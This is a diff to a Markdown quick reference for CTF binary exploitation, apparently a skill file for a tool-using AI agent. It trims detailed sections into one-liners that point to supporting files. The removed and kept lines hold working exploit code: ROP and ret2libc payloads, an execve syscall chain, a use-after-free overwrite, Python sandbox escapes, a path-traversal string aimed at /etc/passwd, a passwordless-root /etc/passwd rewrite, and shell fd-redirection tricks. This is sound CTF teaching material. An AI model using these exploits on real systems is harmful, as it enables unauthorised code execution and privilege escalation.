@@ -7,20 +7,23 @@ allowed-tools: ["Bash", "Read", "Write", "Edit", "Glob", "Grep", "Task", "WebFet
 
 # CTF Binary Exploitation (Pwn)
 
-Quick reference for pwn challenges. For detailed techniques, see supporting files.
+Quick reference for binary exploitation (pwn) CTF challenges. Each technique has a one-liner here; see supporting files for full details.
 
 ## Additional Resources
 
-- [format-string.md](format-string.md) - Format string exploitation (leaks, GOT overwrite, blind pwn, filter bypass)
-- [advanced.md](advanced.md) - Advanced techniques (heap, JIT, esoteric GOT, custom allocators, DNS overflow, MD5 preimage, .fini_array, shell tricks, ASAN)
+- [overflow-basics.md](overflow-basics.md) - Stack/global buffer overflow, ret2win, canary bypass, struct pointer overwrite, signed integer bypass, hidden gadgets
+- [rop-and-shellcode.md](rop-and-shellcode.md) - ROP chains (ret2libc, syscall ROP), shellcode with input reversal, seccomp bypass, .fini_array hijack, pwntools template
+- [format-string.md](format-string.md) - Format string exploitation (leaks, GOT overwrite, blind pwn, filter bypass, canary leak, __free_hook)
+- [advanced.md](advanced.md) - Heap, JIT, esoteric GOT, custom allocators, DNS overflow, MD5 preimage, ASAN, rdx control, canary-aware overflow, CSV injection
+- [sandbox-escape.md](sandbox-escape.md) - Python sandbox escape, custom VM exploitation, FUSE/CUSE devices, busybox/restricted shell, shell tricks
 
 ---
 
 ## Source Code Red Flags
 
-- Threading/`pthread` → race conditions
-- `usleep()`/`sleep()` → timing windows
-- Global variables in multiple threads → TOCTOU
+- Threading/`pthread` -> race conditions
+- `usleep()`/`sleep()` -> timing windows
+- Global variables in multiple threads -> TOCTOU
 
 ## Race Condition Exploitation
 
@@ -34,60 +37,6 @@ bash -c '{ echo "cmd1"; echo "cmd2"; sleep 1; } | nc host port'
 - Format string: `printf(user_input)`
 - Integer overflow, UAF, race conditions
 
-## Kernel Exploitation
-
-- Look for vulnerable `lseek` handlers allowing OOB read/write
-- Heap grooming with forked processes
-- SUID binary exploitation via kernel-to-userland buffer overflow
-- Check kernel config for disabled protections:
-  - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
-  - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations
-
-## FUSE/CUSE Character Device Exploitation
-
-**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)
-
-**Identification:**
-- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
-- Device operations struct with `open`, `read`, `write` handlers
-- Device name registered via `DEVNAME=backdoor` or similar
-
-**Common vulnerability patterns:**
-```c
-// Backdoor pattern: write handler with command parsing
-void backdoor_write(const char *input, size_t len) {
-    char *cmd = strtok(input, ":");
-    char *file = strtok(NULL, ":");
-    char *mode = strtok(NULL, ":");
-    if (!strcmp(cmd, "b4ckd00r")) {
-        chmod(file, atoi(mode));  // Arbitrary chmod!
-    }
-}
-```
-
-**Exploitation:**
-```bash
-# Change /etc/passwd permissions via custom device
-echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor
-
-# 511 decimal = 0777 octal (rwx for all)
-# Now modify passwd to get root
-echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
-su root
-```
-
-**Privilege escalation via passwd modification:**
-1. Make `/etc/passwd` writable via the backdoor
-2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
-3. `su root` without password prompt
-
-## Busybox/Restricted Shell Escalation
-
-When in restricted environment without sudo:
-1. Find writable paths via character devices
-2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
-3. Modify permissions then content to gain root
-
 ## Protection Implications for Exploit Strategy
 
 | Protection | Status | Implication |
@@ -99,308 +48,56 @@ When in restricted environment without sudo:
 | Canary | Present | Stack smash detected - need leak or avoid stack overflow (use heap) |
 
 **Quick decision tree:**
-- Partial RELRO + No PIE → GOT overwrite (easiest, use fixed addresses)
-- Full RELRO → target `__free_hook`, `__malloc_hook` (glibc < 2.34), or return addresses
-- Stack canary present → prefer heap-based attacks or leak canary first
+- Partial RELRO + No PIE -> GOT overwrite (easiest, use fixed addresses)
+- Full RELRO -> target `__free_hook`, `__malloc_hook` (glibc < 2.34), or return addresses
+- Stack canary present -> prefer heap-based attacks or leak canary first
 
 ## Stack Buffer Overflow
 
-1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
+1. Find offset: `cyclic 200` then `cyclic -l <value>`
 2. Check protections: `checksec --file=binary`
 3. No PIE + No canary = direct ROP
 4. Canary leak via format string or partial overwrite
 
-### ret2win with Parameter (Magic Value Check)
+**ret2win with magic value:** Overflow -> `ret` (alignment) -> `pop rdi; ret` -> magic -> win(). See [overflow-basics.md](overflow-basics.md) for full exploit code.
 
-**Pattern:** Win function checks argument against magic value before printing flag.
+**Stack alignment:** Modern glibc needs 16-byte alignment; SIGSEGV in `movaps` = add extra `ret` gadget. See [overflow-basics.md](overflow-basics.md).
 
-```c
-// Common pattern in disassembly
-void win(long arg) {
-    if (arg == 0x1337c0decafebeef) {  // Magic check
-        // Open and print flag
-    }
-}
-```
+**Offset calculation:** Buffer at `rbp - N`, return at `rbp + 8`, total = N + 8. See [overflow-basics.md](overflow-basics.md).
 
-**Exploitation (x86-64):**
-```python
-from pwn import *
+**Input filtering:** `memmem()` checks block certain byte sequences; assert payload doesn't contain banned strings. See [overflow-basics.md](overflow-basics.md).
 
-# Find gadgets
-pop_rdi_ret = 0x40150b   # pop rdi; ret
-ret = 0x40101a           # ret (for stack alignment)
-win_func = 0x4013ac
-magic = 0x1337c0decafebeef
-
-offset = 112 + 8  # = 120 bytes to reach return address
-
-payload = b"A" * offset
-payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
-payload += p64(pop_rdi_ret)
-payload += p64(magic)
-payload += p64(win_func)
-```
-
-**Finding the win function:**
-- Search for `fopen("flag.txt")` or similar in Ghidra
-- Look for functions with no XREF that check a magic parameter
-- Check for conditional print/exit patterns after parameter comparison
-
-### Stack Alignment (16-byte Requirement)
-
-Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
-- SIGSEGV in `movaps` instruction (SSE requires alignment)
-- Crash inside libc functions (printf, system, etc.)
-
-**Fix:** Add extra `ret` gadget before your ROP chain:
-```python
-payload = b"A" * offset
-payload += p64(ret)        # Align stack to 16 bytes
-payload += p64(pop_rdi_ret)
-# ... rest of chain
-```
-
-### Offset Calculation from Disassembly
-
-```asm
-push   %rbp
-mov    %rsp,%rbp
-sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
-...
-lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
-mov    $0xf0,%edx        ; read() size = 240 (overflow!)
-```
-
-**Calculate offset:**
-- Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
-- Saved RBP is at `rbp` (0 offset from buffer end)
-- Return address is at `rbp + 8`
-- **Total offset = buffer_offset + 8** = 112 + 8 = 120 bytes
-
-### Input Filtering (memmem checks)
-
-Some challenges filter input using `memmem()` to block certain strings:
-```python
-payload = b"A" * 120 + p64(gadget) + p64(value)
-assert b"badge" not in payload and b"token" not in payload
-```
-
-### Finding Gadgets
-
-```bash
-# Find pop rdi; ret
-objdump -d binary | grep -B1 "pop.*rdi"
-ROPgadget --binary binary | grep "pop rdi"
-
-# Find simple ret (for alignment)
-objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
-```
-
-### Hidden Gadgets in CMP Immediates
-
-CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:
-
-```asm
-# Example: cmpl $0xc35e415f, -0x4(%rbp)
-# Bytes: 81 7d fc 5f 41 5e c3
-#                  ^^ ^^ ^^ ^^
-# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
-# At +4: 41 5e c3    = pop r14; ret
-# At +5: 5e c3       = pop rsi; ret
-```
-
-**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates — their operand bytes may decode as useful gadgets.
-
-```python
-rop = ROP(elf)
-# pwntools finds these automatically
-for addr, gadget in rop.gadgets.items():
-    print(hex(addr), gadget)
-```
+**Finding gadgets:** `ROPgadget --binary binary | grep "pop rdi"`, or use pwntools `ROP()` which also finds hidden gadgets in CMP immediates. See [overflow-basics.md](overflow-basics.md).
 
 ## Struct Pointer Overwrite (Heap Menu Challenges)
 
-**Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.
+**Pattern:** Menu create/modify/delete on structs with data buffer + pointer. Overflow name into pointer field with GOT address, then write win address via modify. See [overflow-basics.md](overflow-basics.md) for full exploit and GOT target selection table.
 
-**Struct layout example:**
-```c
-struct Student {
-    char name[36];      // offset 0x00 - data buffer
-    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
-    float gpa;          // offset 0x28
-};  // total: 0x2c (44 bytes)
-```
+## Signed Integer Bypass
 
-**Exploitation:**
-```python
-from pwn import *
+**Pattern:** `scanf("%d")` without sign check; negative quantity * price = negative total, bypasses balance check. See [overflow-basics.md](overflow-basics.md).
 
-WIN = 0x08049316
-GOT_TARGET = 0x0804c00c  # printf@GOT
+## Canary-Aware Partial Overflow
 
-# 1. Create object (allocates struct + sub-allocations)
-create_student("AAAA", 5, 3.5)
+**Pattern:** Overflow `valid` flag between buffer and canary. Use `./` as no-op path padding for precise length. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit chain.
 
-# 2. Modify name - overflow into pointer field with GOT address
-payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
-modify_name(0, payload)
+## Global Buffer Overflow (CSV Injection)
 
-# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
-modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry
-
-# 4. Trigger overwritten function -> jumps to win
-```
-
-**GOT target selection strategy:**
-- Identify which libc functions the `win` function calls internally
-- Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
-- Prefer functions called in the main loop AFTER the write
-
-| Win uses | Safe GOT targets |
-|----------|-------------------|
-| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
-| printf, system | puts, exit, free |
-| system only | puts, printf, exit |
+**Pattern:** Adjacent global variables; overflow via extra CSV delimiters changes filename pointer. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit.
 
 ## ROP Chain Building
 
-```python
-from pwn import *
+Leak libc via `puts@PLT(puts@GOT)`, return to vuln, stage 2 with `system("/bin/sh")`. See [rop-and-shellcode.md](rop-and-shellcode.md) for full two-stage ret2libc pattern, leak parsing, and return target selection.
 
-elf = ELF('./binary')
-libc = ELF('./libc.so.6')
-rop = ROP(elf)
+**Raw syscall ROP:** When `system()`/`execve()` crash (CET/IBT), use `pop rax; ret` + `syscall; ret` from libc. See [rop-and-shellcode.md](rop-and-shellcode.md).
 
-# Common gadgets
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret = rop.find_gadget(['ret'])[0]
+**rdx control:** After `puts()`, rdx is clobbered to 1. Use `pop rdx; pop rbx; ret` from libc, or re-enter binary's read setup + stack pivot. See [rop-and-shellcode.md](rop-and-shellcode.md) and [advanced.md](advanced.md).
 
-# Leak libc
-payload = flat(
-    b'A' * offset,
-    pop_rdi,
-    elf.got['puts'],
-    elf.plt['puts'],
-    elf.symbols['main']
-)
-```
-
-### Two-Stage ret2libc (Leak + Shell)
-
-When exploiting in two stages, choose the return target for stage 2 carefully:
-
-```python
-# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
-payload1 = b'A' * offset
-payload1 += p64(pop_rdi)
-payload1 += p64(elf.got['puts'])
-payload1 += p64(elf.plt['puts'])
-payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main
-
-# IMPORTANT: Return target after leak
-# - Returning to main may crash if check_status/setup corrupts stack
-# - Returning to vuln directly may have stack issues
-# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
-#   This sets up a clean stack frame via the CALL instruction
-```
-
-**Leak parsing with no-newline printf:**
-```python
-# If printf("Laundry complete") has no trailing newline,
-# puts() leak appears right after it on the same line:
-# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
-p.recvuntil(b'Laundry complete')
-leaked = p.recvline().strip()
-libc_addr = u64(leaked.ljust(8, b'\x00'))
-```
-
-### Raw Syscall ROP (When system() Fails)
-
-If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:
-
-```python
-# Find gadgets in libc
-libc_rop = ROP(libc)
-pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
-pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
-pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
-pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
-syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]
-
-# execve("/bin/sh", NULL, NULL) = syscall 59
-payload = b'A' * offset
-payload += p64(libc_base + pop_rax)
-payload += p64(59)
-payload += p64(libc_base + pop_rdi)
-payload += p64(libc_base + next(libc.search(b'/bin/sh')))
-payload += p64(libc_base + pop_rsi)
-payload += p64(0)
-payload += p64(libc_base + pop_rdx_rbx)
-payload += p64(0)
-payload += p64(0)  # rbx junk
-payload += p64(libc_base + syscall_ret)
-```
-
-**When to use raw syscall vs libc functions:**
-- `system()` through libc: simplest, but may crash due to stack alignment or CET
-- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
-- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
-- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead
-
-### Shell Interaction After execve
-
-After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.
-
-```python
-p.send(payload)  # Trigger execve
-
-# Wait for shell to initialize before sending commands
-import time
-time.sleep(1)
-p.sendline(b'id')
-time.sleep(0.5)
-result = p.recv(timeout=3)
-
-# For flag retrieval:
-p.sendline(b'cat /flag* flag* 2>/dev/null')
-time.sleep(0.5)
-flag = p.recv(timeout=3)
-
-# DON'T pipe commands via stdin when using pwntools - they get consumed
-# by earlier read() calls. Use explicit sendline() after delays instead.
-```
-
-## Pwntools Template
-
-```python
-from pwn import *
-
-context.binary = elf = ELF('./binary')
-context.log_level = 'debug'
-
-def conn():
-    if args.REMOTE:
-        return remote('host', port)
-    return process('./binary')
-
-io = conn()
-# exploit here
-io.interactive()
-```
-
-## Useful Commands
-
-```bash
-one_gadget libc.so.6           # Find one-shot gadgets
-ropper -f binary               # Find ROP gadgets
-ROPgadget --binary binary      # Alternative gadget finder
-seccomp-tools dump ./binary    # Check seccomp rules
-```
+**Shell interaction:** After `execve`, `sleep(1)` then `sendline(b'cat /flag*')`. See [rop-and-shellcode.md](rop-and-shellcode.md).
 
 ## Use-After-Free (UAF) Exploitation
 
-**Pattern:** Menu-based programs with create/delete/view operations where `free()` doesn't NULL the pointer.
+**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer.
 
 **Classic UAF flow:**
 1. Create object A (allocates chunk with function pointer)
@@ -408,47 +105,36 @@ seccomp-tools dump ./binary    # Check seccomp rules
 3. Free object A (creates dangling pointer)
 4. Allocate object B of **same size** (reuses freed chunk via tcache)
 5. Object B data overwrites A's function pointer with `win()` address
-6. Trigger A's callback → jumps to `win()`
+6. Trigger A's callback -> jumps to `win()`
 
 **Key insight:** Both structs must be the same size for tcache to reuse the chunk.
 
 ```python
-# UAP Watch pattern
 create_report("sighting-0")  # 64-byte struct with callback ptr at +56
 leak = inspect_report(0)      # Leak callback address for PIE bypass
 pie_base = leak - redaction_offset
 win_addr = pie_base + win_offset
 
 delete_report(0)              # Free chunk, dangling pointer remains
-# Allocate same-size struct, overwriting callback
-create_signal(b"A"*56 + p64(win_addr))
-analyze_report(0)             # Calls dangling pointer → win()
+create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
+analyze_report(0)             # Calls dangling pointer -> win()
 ```
 
 ## Seccomp Bypass
 
-Alternative syscalls when seccomp blocks `open()`/`read()`:
-- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`
+Alternative syscalls when seccomp blocks `open()`/`read()`: `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`.
 
 **Check rules:** `seccomp-tools dump ./binary`
 
-See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.
+See [rop-and-shellcode.md](rop-and-shellcode.md) for quick reference and [advanced.md](advanced.md) for conditional buffer address restrictions, shellcode without relocations, `scmp_arg_cmp` struct layout.
 
 ## Stack Shellcode with Input Reversal
 
-**Pattern (Scarecode):** Binary reverses input buffer before returning.
+**Pattern:** Binary reverses input buffer. Pre-reverse shellcode, use partial 6-byte RIP overwrite, trampoline `jmp short` to NOP sled. See [rop-and-shellcode.md](rop-and-shellcode.md).
 
-**Strategy:**
-1. Leak address via info-leak command (bypass PIE)
-2. Find `sub rsp, 0x10; jmp *%rsp` gadget
-3. Pre-reverse shellcode and RIP overwrite bytes
-4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
-5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode
+## .fini_array Hijack
 
-**Null-byte avoidance with `scanf("%s")`:**
-- Can't embed `\x00` in payload
-- Use partial pointer overwrite (6 bytes) — top 2 bytes match since same mapping
-- Use short jumps and NOP sleds instead of multi-address ROP chains
+Writable `.fini_array` + arbitrary write -> overwrite with win/shellcode address. Works even with Full RELRO. See [rop-and-shellcode.md](rop-and-shellcode.md) for implementation.
 
 ## Path Traversal Sanitizer Bypass
 
@@ -456,7 +142,7 @@ See [advanced.md](advanced.md) for: conditional buffer address restrictions, she
 
 ```python
 # Sanitizer removes '.' and '/' but skips next char after match
-# ../../etc/passwd → bypass with doubled chars:
+# ../../etc/passwd -> bypass with doubled chars:
 "....//....//etc//passwd"
 # Each '..' becomes '....' (first '.' caught, second skipped, third caught, fourth survives)
 ```
@@ -465,39 +151,28 @@ See [advanced.md](advanced.md) for: conditional buffer address restrictions, she
 - If binary opens flag file but doesn't close fd, read via `/proc/self/fd/3`
 - fd 0=stdin, 1=stdout, 2=stderr, 3=first opened file
 
-## Signed Integer Bypass (Negative Quantity)
+## Kernel Exploitation
 
-**Pattern (PascalCTF 2026):** `scanf("%d")` for quantity without sign check. Negative input → `qty * price` negative → bypasses `balance >= total_cost`. **Red flag:** `scanf("%d")` or `atoi()` for quantities.
+- Look for vulnerable `lseek` handlers allowing OOB read/write
+- Heap grooming with forked processes
+- SUID binary exploitation via kernel-to-userland buffer overflow
+- Check kernel config for disabled protections:
+  - `CONFIG_SLAB_FREELIST_RANDOM=n` -> sequential heap chunks
+  - `CONFIG_SLAB_MERGE_DEFAULT=n` -> predictable allocations
 
-## Canary-Aware Partial Overflow
+## Format String Quick Reference
 
-**Pattern (MyGit, PascalCTF 2026):** Overflow `valid` flag (offset 32) without touching canary (offset 40). Use `./` as no-op path padding for precise length control. See [advanced.md](advanced.md) for full exploit chain.
+- Leak stack: `%p.%p.%p.%p.%p.%p` | Leak specific: `%7$p`
+- Write: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte full 64-bit)
+- GOT overwrite for code execution (Partial RELRO required)
 
-## Global Buffer Overflow (CSV Injection)
-
-**Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.
-
-## MD5 Preimage Gadget Construction
-
-**Pattern (Hashchain, Nullcon 2026):** Brute-force MD5 preimages with `eb 0c` prefix (jmp +12) to skip middle bytes, using bytes 14-15 as 2-byte i386 instructions. Build syscall chains from gadgets like `31c0` (xor eax), `cd80` (int 0x80).
-
-See [advanced.md](advanced.md) for C brute-force code, gadget list, and v2 (4-byte prefix) technique.
-
-## .fini_array Hijack
-
-**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO. Overwrite with `%hn` writes to shellcode/win address.
-
-See [advanced.md](advanced.md) for implementation details.
+See [format-string.md](format-string.md) for GOT overwrite patterns, blind pwn, filter bypass, canary+PIE leak, `__free_hook` overwrite, and argument retargeting.
 
 ## .rela.plt / .dynsym Patching (Format String)
 
-**When to use:** GOT addresses contain bad bytes (e.g., 0x0a with fgets), making direct GOT overwrite impossible. Requires `.rela.plt` and `.dynsym` in writable memory (check first PT_LOAD segment).
+**When to use:** GOT addresses contain bad bytes (e.g., 0x0a with fgets), making direct GOT overwrite impossible. Requires `.rela.plt` and `.dynsym` in writable memory.
 
-**Technique:** Instead of overwriting GOT entries directly, modify the dynamic linking metadata:
-
-1. **Patch `.rela.plt` relocation entry:** Change the symbol index in `r_info` of a PLT entry (e.g., `exit@plt`) to point to a different symbol (e.g., `stdout`, symbol index 11)
-2. **Patch `.dynsym` symbol entry:** Overwrite `st_value` of the target symbol with `win()` address
-3. **Trigger:** When the original function (`exit`) is called, the dynamic linker reads the patched relocation, looks up the patched symbol, and jumps to `win()`
+**Technique:** Patch `.rela.plt` relocation entry symbol index to point to different symbol, then patch `.dynsym` symbol's `st_value` with `win()` address. When the original function is called, dynamic linker reads patched relocation and jumps to `win()`.
 
 ```python
 # Key addresses (from readelf -S)
@@ -513,47 +188,88 @@ STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword
 
 **When GOT has bad bytes but .rela.plt/.dynsym don't:** This technique bypasses all GOT byte restrictions since you never write to GOT directly.
 
-## Python Sandbox Escape (eval/exec Challenges)
+## Heap Exploitation
 
-**AST bypass via f-strings:** Validators that `pass` on `JoinedStr` (f-string AST nodes) don't recurse into children, allowing arbitrary expressions inside `f"{...}"`:
-```python
-# Bypasses AST validation that blocks Call nodes
-payload = 'f"{().__class__.__mro__[1].__subclasses__()}"'
-```
+- tcache poisoning (glibc 2.26+), fastbin dup / double free
+- House of Force (old glibc), unsorted bin attack
+- Check glibc version: `strings libc.so.6 | grep GLIBC`
+- Freed chunks contain libc pointers (fd/bk) -> leak via error messages or missing null-termination
+- Heap feng shui: control alloc order/sizes, create holes, place targets adjacent to overflow source
 
-**Audit hook bypass:** `isinstance(args[0], str)` check bypassed by passing `b'flag.txt'` (bytes) instead of `str`:
-```python
-# Audit hook checks: isinstance(filename, str) → True blocks it
-# Bypass: open(b'flag.txt') → isinstance(b'flag.txt', str) → False
-```
+See [advanced.md](advanced.md) for custom allocator exploitation (nginx pools), heap overlap via base conversion, tree data structure stack underallocation.
 
-**Builtin recovery chain:**
-```python
-# Walk MRO to recover __builtins__
-B = [c for c in ().__class__.__mro__[1].__subclasses__()
-     if c.__init__.__class__.__name__ == 'function'][0].__init__.__globals__['__builtins__']
-B['open'](b'flag.txt').read()
-```
+## JIT Compilation Exploits
+
+**Pattern:** Off-by-one in instruction encoding -> misaligned machine code. Embed shellcode as operand bytes of subtraction operations, chain with 2-byte `jmp` instructions. See [advanced.md](advanced.md).
+
+## Esoteric Language GOT Overwrite
+
+**Pattern:** Brainfuck/Pikalang interpreter with unbounded tape = arbitrary read/write relative to buffer base. Move pointer to GOT, overwrite byte-by-byte with `system()`. See [advanced.md](advanced.md).
+
+## DNS Record Buffer Overflow
+
+**Pattern:** Many AAAA records overflow stack buffer in DNS response parser. Set up DNS server with excessive records, overwrite return address. See [advanced.md](advanced.md).
+
+## ASAN Shadow Memory Exploitation
+
+**Pattern:** Binary with AddressSanitizer has format string + OOB write. ASAN may use "fake stack" (50% chance). Leak PIE, detect real vs fake stack, calculate OOB write offset to overwrite return address. See [advanced.md](advanced.md).
+
+## Format String with RWX .fini_array Hijack
+
+**Pattern (Encodinator):** Base85-encoded input in RWX memory passed to `printf()`. Write shellcode to RWX region, overwrite `.fini_array[0]` via format string `%hn` writes. Use convergence loop for base85 argument numbering. See [advanced.md](advanced.md).
+
+## Custom Canary Preservation
+
+**Pattern:** Buffer overflow must preserve known canary value. Write exact canary bytes at correct offset: `b'A' * 64 + b'BIRD' + b'X'`. See [advanced.md](advanced.md).
+
+## MD5 Preimage Gadget Construction
+
+**Pattern (Hashchain):** Brute-force MD5 preimages with `eb 0c` prefix (jmp +12) to skip middle bytes; bytes 14-15 become 2-byte i386 instructions. Build syscall chains from gadgets like `31c0` (xor eax), `cd80` (int 0x80). See [advanced.md](advanced.md) for C code and v2 technique.
+
+## Python Sandbox Escape
+
+AST bypass via f-strings, audit hook bypass with `b'flag.txt'` (bytes vs str), MRO-based `__builtins__` recovery. See [sandbox-escape.md](sandbox-escape.md).
 
 ## VM Exploitation (Custom Bytecode)
 
-**Pattern (TerViMator, Pragyan 2026):** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.
+**Pattern:** Custom VM with OOB read/write in syscalls. Leak PIE via XOR-encoded function pointer, overflow to rewrite pointer with `win() ^ KEY`. See [sandbox-escape.md](sandbox-escape.md).
 
-**Common vulnerabilities in VM syscalls:**
-- **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking → read/modify object struct data beyond allocated buffer
-- **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields
+## FUSE/CUSE Character Device Exploitation
 
-**Exploitation pattern:**
-1. Allocate two objects (data + exec)
-2. Use OOB `inspect` to read exec object's XOR-encoded function pointer → leak PIE base
-3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
-4. `execute(obj)` decodes and calls the patched function pointer
+Look for `cuse_lowlevel_main()` / `fuse_main()`, backdoor write handlers with command parsing. Exploit to `chmod /etc/passwd` then modify for root access. See [sandbox-escape.md](sandbox-escape.md).
+
+## Busybox/Restricted Shell Escalation
+
+Find writable paths via character devices, target `/etc/passwd` or `/etc/sudoers`, modify permissions then content. See [sandbox-escape.md](sandbox-escape.md).
 
 ## Shell Tricks
 
-**Quick reference:**
-- `exec<&3;sh>&3` - redirect stdin/stdout to fd 3 (common network socket)
-- `ls -la /proc/self/fd` - find correct fd
-- `sh<&3 >&3` or `$0` instead of `sh` - minimal alternatives
+`exec<&3;sh>&3` for fd redirection, `$0` instead of `sh`, `ls -la /proc/self/fd` to find correct fd. See [sandbox-escape.md](sandbox-escape.md).
 
-See [advanced.md](advanced.md) for more details.
+## Useful Commands
+
+```bash
+checksec --file=binary          # Check binary protections
+one_gadget libc.so.6            # Find one-shot gadgets
+ropper -f binary                # Find ROP gadgets
+ROPgadget --binary binary       # Alternative gadget finder
+seccomp-tools dump ./binary     # Check seccomp rules
+strings libc.so.6 | grep GLIBC # Check glibc version
+```
+
+## Pwntools Template
+
+```python
+from pwn import *
+context.binary = elf = ELF('./binary')
+context.log_level = 'debug'
+def conn():
+    if args.REMOTE:
+        return remote('host', port)
+    return process('./binary')
+io = conn()
+# exploit here
+io.interactive()
+```
+
+See [rop-and-shellcode.md](rop-and-shellcode.md) for the full template.
